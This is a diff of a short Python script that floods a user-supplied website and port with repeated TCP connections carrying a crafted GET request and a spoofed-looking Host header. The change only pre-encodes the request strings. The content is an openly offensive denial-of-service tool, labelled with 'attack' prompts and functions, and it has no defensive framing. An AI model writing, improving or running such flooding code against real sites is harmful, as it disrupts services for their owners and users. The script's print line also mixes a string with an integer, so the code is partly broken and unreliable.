@@ -6,8 +6,8 @@ target = input("Target website: ")
 port = int(input("Target Port: "))
 attack_count = int(input("Amount of attacks: "))
 
-get = "GET /" + target + " HTTP/1.1\r\n"
-host = "Host: " + fake_ip + "\r\n\r\n"
+get = ("GET /" + target + " HTTP/1.1\r\n").encode('ascii')
+host = ("Host: " + fake_ip + "\r\n\r\n").encode('ascii')
 target_port = (target, port)
 
 def attack(count):
@@ -15,8 +15,8 @@ def attack(count):
         try:
             s = socket(AF_INET, SOCK_STREAM)
             s.connect(target_port)
-            s.sendto((get).encode('ascii'),target_port)
-            s.sendto((host).encode('ascii'),target_port)
+            s.sendto(get,target_port)
+            s.sendto(host,target_port)
             s.close()
             print("Successfull: " + count)
         except ConnectionRefusedError:
